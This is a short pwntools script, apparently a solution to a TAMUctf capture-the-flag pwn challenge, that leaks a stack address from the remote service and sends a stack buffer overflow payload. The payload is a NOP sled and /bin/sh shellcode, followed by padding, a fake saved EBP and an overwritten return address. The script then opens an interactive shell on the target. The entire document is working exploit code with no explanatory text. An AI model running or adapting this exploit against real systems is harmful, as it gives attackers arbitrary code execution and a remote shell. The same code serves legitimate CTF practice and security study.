from pwn import *

r=remote('pwn.tamuctf.com',4323)
print r.recvuntil("your journey ").decode()
a=int(r.recv(1024).split("\n")[0].strip("!")[2:], 16)
print(a)
addr = p32(a)
ebp  = p32(a + 100)
print hex(a)
eip  = addr
shellcode = "\x90" * 4 + asm(shellcraft.sh())
print len(shellcode)
residue = 0xEE - len(shellcode)
payload = shellcode + 'X' * residue + ebp + eip
raw_input('fire?')
r.send(payload + '\n')
print r.recv(1024).decode()
fp = open('payload3', 'w')
fp.write(payload)
fp.close()

r.interactive()
